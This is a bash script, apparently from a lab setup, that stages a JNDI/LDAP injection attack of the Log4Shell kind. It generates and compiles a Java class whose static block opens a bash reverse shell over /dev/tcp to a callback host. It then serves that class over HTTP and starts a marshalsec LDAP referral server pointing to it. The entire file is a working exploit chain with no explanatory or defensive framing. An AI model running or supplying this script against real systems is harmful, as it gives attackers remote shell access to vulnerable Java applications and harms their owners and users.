#!/bin/bash
set -e

ATTACKER_IP="${ATTACKER_IP:-10.0.0.20}"
CALLBACK_IP="${CALLBACK_IP:-10.0.0.5}"
CALLBACK_PORT="${CALLBACK_PORT:-4444}"
PAYLOAD_PORT=8080
LDAP_PORT=1389

# Generate and compile Exploit.java with callback IP/port baked in
echo "[*] Compiling Exploit.class (callback: ${CALLBACK_IP}:${CALLBACK_PORT})..."
cd /opt/payloads

cat > Exploit.java << EOF
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{
                "/bin/bash", "-c",
                "bash -i >& /dev/tcp/${CALLBACK_IP}/${CALLBACK_PORT} 0>&1"
            });
        } catch (Exception e) { e.printStackTrace(); }
    }
}
EOF

javac Exploit.java
echo "[*] Exploit.class ready."

echo "[*] Starting payload HTTP server on :${PAYLOAD_PORT}..."
python3 -m http.server ${PAYLOAD_PORT} &

echo "[*] Starting marshalsec LDAP relay on :${LDAP_PORT}..."
exec java -cp /opt/marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://${ATTACKER_IP}:${PAYLOAD_PORT}/#Exploit" \
    ${LDAP_PORT}
